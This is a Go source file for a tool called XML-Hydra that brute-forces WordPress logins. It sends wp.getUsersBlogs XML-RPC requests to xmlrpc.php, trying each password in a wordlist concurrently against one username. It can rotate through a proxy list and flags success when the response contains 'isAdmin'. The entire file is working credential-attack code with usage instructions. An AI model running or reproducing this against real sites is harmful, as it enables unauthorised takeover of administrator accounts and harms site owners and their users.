package main

import (
	"bufio"
	"container/ring"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/schollz/progressbar/v3"
)

const banner = `__________________________________________________________________________________________
___  ___  ___      ___  ___-      __    __  ___  ___  ________    _______        __      
|"  \/"  ||"  \    /"  ||"  |     /" |  | "\|"  \/"  ||"      "\  /"      \      /""\     
 \   \  /  \   \  //   |||  |    (:  (__)  :)\   \  / (.  ___  :)|:        |    /    \    
  \\  \/   /\\  \/.    ||:  |     \/      \/  \\  \/  |: \   ) |||_____/   )   /' /\  \   
  /\.  \  |: \.        | \  |___  //  __  \\  /   /   (| (___\ || //      /   //  __'  \  
 /  \   \ |.  \    /:  |( \_|:  \(:  (  )  :)/   /    |:       :)|:  __   \  /   /  \\  \ 
|___/\___||___|\__/|___| \_______)\__|  |__/|___/     (________/ |__|  \___)(___/    \___)                             

# XML-Hydra
# https://github.com/prasant-paudel/xml-hydra
__________________________________________________________________________________________
`

const printDefaults = `
Usage: xml-hydra [OPTIONS]

OPTIONS:
 -t    Target URL
 -u    Username
 -w    Wordlist for passwords
 -g    Number of goroutines to execute at a time (Default=4)
 -P    Proxy list
 -h    Shows help message

EXAMPLE:  xml-hydra -t https://example.com/xmlrpc.php -u username -w passwords.txt
`

var (
	targetUrl string
	username  string
	wordlist  string
	gnum      int
	help      bool
	proxyList string
	re        = regexp.MustCompile(`(<name>isAdmin<\/name>)`)
)

func argParse() {
	flag.StringVar(&targetUrl, "t", "", "Target URL")
	flag.StringVar(&username, "u", "", "Username")
	flag.StringVar(&wordlist, "w", "", "Wordlist for passwords")
	flag.IntVar(&gnum, "g", 4, "Number of goroutines to execute at a time (Default=4)")
	flag.StringVar(&proxyList, "P", "", "Proxy list")
	flag.BoolVar(&help, "h", false, "Shows help message")

	flag.Parse()

	if help || targetUrl == "" || username == "" || wordlist == "" {
		fmt.Printf(banner + printDefaults)
		fmt.Println(targetUrl)
		os.Exit(0)
	}
}

type Request struct {
	URL      string
	Username string
	Password string
	ProxyURL string
}

type Response struct {
	Match   bool
	Request Request
	Error   error
}

type CircularList struct {
	list *ring.Ring
}

func main() {
	argParse()

	reqCh := make(chan Request)
	resCh := make(chan Response)

	passwords := ReadFileLines(wordlist)

	go CreateRequests(targetUrl, username, passwords, reqCh)

	for i := 0; i < gnum; i++ {
		go SendRequests(reqCh, resCh)
	}

	bar := progressbar.Default(int64(len(passwords)))

	for r := range resCh {
		if r.Error != nil {
			fmt.Printf("\n[!] Error checking (%s:%s)\n%s", r.Request.Username, r.Request.Password, r.Error.Error())
		} else if r.Match {
			fmt.Printf("\n[+] Matched -> %s:%s\n", r.Request.Username, r.Request.Password)
			break
		}
		bar.Add(1)
	}
}

func CreateRequests(url, username string, passwords []string, ch chan<- Request) {
	if proxyList == "" {
		for _, pw := range passwords {
			ch <- Request{
				URL:      url,
				Username: username,
				Password: pw,
				ProxyURL: "",
			}
		}
	} else {
		pp := NewProxyPool(ReadFileLines(proxyList))
		schemeRegex := regexp.MustCompile(`(\w+:\/\/)`)

		for _, pw := range passwords {
			proxyUrl := fmt.Sprint(pp.GetItem())
			if !schemeRegex.MatchString(proxyUrl) {
				proxyUrl = schemeRegex.FindString(url) + proxyUrl
			}

			ch <- Request{
				URL:      url,
				Username: username,
				Password: pw,
				ProxyURL: proxyUrl,
			}
		}
	}
	close(ch)
}

func SendRequests(in <-chan Request, out chan<- Response) {
	for r := range in {
		out <- r.Send()
	}
}

func (r *Request) Body() io.Reader {
	return strings.NewReader(fmt.Sprintf(`
	<?xml version="1.0" encoding="UTF-8"?>
	<methodCall>
	  <methodName>wp.getUsersBlogs</methodName>
	  <params>
	    <param><value>%s</value></param>
	    <param><value>%s</value></param>
	  </params>
	</methodCall>`, r.Username, r.Password))
}

func (r *Request) Send() Response {
	req, _ := http.NewRequest("POST", r.URL, r.Body())

	client := CreateHTTPCLient(r.ProxyURL)
	res, err := client.Do(req)

	if err != nil {
		return Response{
			Match:   false,
			Request: *r,
			Error:   err,
		}
	}

	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)

	if err != nil {
		return Response{Match: false, Request: *r, Error: err}
	}

	return Response{
		Match:   re.Match(body),
		Request: *r,
	}
}

func CreateHTTPCLient(proxyUrl string) (client http.Client) {
	if proxyUrl != "" {
		proxyURL, err := url.Parse(proxyUrl)
		if err != nil {
			log.Printf("[!] Failed to parse proxy %s", proxyUrl)
		}
		transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
		client = http.Client{Transport: transport}
	} else {
		client = http.Client{}
	}
	return
}

func NewProxyPool(items []string) *CircularList {
	cl := &CircularList{
		list: ring.New(len(items)),
	}
	for i := 0; i < cl.list.Len(); i++ {
		cl.list.Value = items[i]
		cl.list = cl.list.Next()
	}
	return cl
}

func (cl *CircularList) GetItem() interface{} {
	val := cl.list.Value
	cl.list = cl.list.Next()
	return val
}

func ReadFileLines(filePath string) []string {
	var lines []string
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		lines = append(lines, strings.TrimSpace(scanner.Text()))
	}
	file.Close()
	return lines
}
